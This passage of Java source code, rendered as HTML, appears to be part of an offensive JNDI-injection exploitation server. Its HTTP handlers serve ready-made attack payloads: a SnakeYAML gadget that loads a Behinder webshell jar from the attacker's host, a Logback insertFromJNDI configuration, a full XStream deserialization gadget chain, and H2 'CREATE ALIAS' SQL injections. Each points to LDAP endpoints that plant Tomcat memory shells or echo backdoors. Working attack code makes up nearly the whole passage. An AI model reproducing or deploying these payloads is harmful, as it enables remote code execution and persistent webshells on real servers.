class="string">&quot;.yml&quot;</span>))&#123;</span><br><span class="line">                        handleYmlRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        handleFileRequest(httpExchange);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] HTTP Server Start Listening on &quot;</span> + Config.httpPort + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleYmlRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">YamlName</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://&quot;</span>+ Config.ip +<span class="string">&quot;:&quot;</span>+ Config.httpPort + <span class="string">&quot;/behinder3.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  dataSourceName: \&quot;ldap://127.0.0.1:1389/basic/TomcatMemShell3\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  autoCommit: true&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (YamlName.equalsIgnoreCase(<span class="string">&quot;snake&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"><span class="comment">//            exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);</span></span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            exchange.getResponseBody().write(yaml.getBytes(&quot;UTF-8&quot;));</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + YamlName + <span class="string">&quot;.yml&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleTXTRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">txtname</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (txtname.equalsIgnoreCase(<span class="string">&quot;isok&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="string">&quot;success!&quot;</span>.getBytes();</span><br><span class="line">            exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + txtname + <span class="string">&quot;.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXMLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name=\&quot;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span>+ Config.ldapPort + <span class="string">&quot;/TomcatBypass/TomcatMemshell3\&quot; as=\&quot;appName\&quot; /&gt;\n&lt;/configuration&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="string">&quot;&lt;linked-hash-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;flags&gt;0&lt;/flags&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;value class=\&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;dataSource class=\&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;is class=\&quot;javax.crypto.CipherInputStream\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;cipher class=\&quot;javax.crypto.NullCipher\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;initialized&gt;false&lt;/initialized&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;opmode&gt;0&lt;/opmode&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;serviceIterator class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;iter class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;iter class=\&quot;java.util.Collections$EmptyIterator\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;next class=\&quot;com.sun.rowset.JdbcRowSetImpl\&quot; serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;dataSource&gt;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:1389/basic/TomcatMemShell3&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/iter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;filter class=\&quot;javax.imageio.ImageIO$ContainsFilter\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;name&gt;getDatabaseMetaData&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;name&gt;foo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/filter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;next class=\&quot;string\&quot;&gt;foo&lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/serviceIterator&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;lock/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/cipher&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;input class=\&quot;java.lang.ProcessBuilder$NullInputStream\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ibuffer&gt;&lt;/ibuffer&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;done&gt;false&lt;/done&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ostart&gt;0&lt;/ostart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ofinish&gt;0&lt;/ofinish&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;closed&gt;false&lt;/closed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/is&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;consumed&gt;false&lt;/consumed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;transferFlavors/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/linked-hash-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(xmlName.equals(<span class="string">&quot;a&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (xmlName.equals(<span class="string">&quot;x&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xstream.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + xmlName + <span class="string">&quot;.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleSQLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;echo&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389/TomcatBypass/TomcatEcho\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;inject&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap:// + host + :1389/inject.class\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + sqlName + <span class="string">&quot;.sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handlerGroovyRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;/TomcatBypass/TomcatEcho&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">groovyName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span 